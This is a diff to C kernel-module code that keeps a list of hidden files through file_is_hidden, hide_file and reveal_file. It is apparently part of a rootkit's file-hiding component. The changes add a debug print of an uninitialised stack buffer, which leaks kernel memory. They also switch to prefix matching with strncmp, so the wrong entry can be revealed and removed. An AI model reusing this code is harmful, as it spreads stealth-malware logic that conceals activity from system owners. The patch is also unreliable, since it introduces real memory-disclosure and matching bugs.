@@ -98,9 +98,11 @@ int file_is_hidden(const char *name)
 {
 	struct hidden_file *cur;
 	struct list_head *cursor, *next;
+	char msg[200];
 
 	list_for_each_safe(cursor, next, &hidden_files) {
 		cur = list_entry(cursor, struct hidden_file, list);
+		DEBUG_PRINT(msg);
 		if (strcmp(cur->file, name) == 0)
 			return 1;
 	}
@@ -129,7 +131,8 @@ int hide_file(char *name)
 	if ((new = kmalloc(sizeof(struct hidden_file), GFP_KERNEL)) == NULL)
 		return -ENOMEM;
 
-	new->file = name;
+	new->file = kmalloc(strlen(name) + 1, GFP_KERNEL);
+	snprintf(new->file, strlen(name) + 1, "%s", name);
 	list_add(&new->list, &hidden_files);
 
 	return 0;
@@ -142,8 +145,9 @@ int reveal_file(char *name)
 
 	list_for_each_safe(cursor, next, &hidden_files) {
 		cur = list_entry(cursor, struct hidden_file, list);
-		if (strcmp(cur->file, name) == 0) {
+		if (strncmp(cur->file, name, strlen(name)) == 0) {
 			list_del(cursor);
+			kfree(cur->file);
 			kfree(cur);
 
 			return 0;
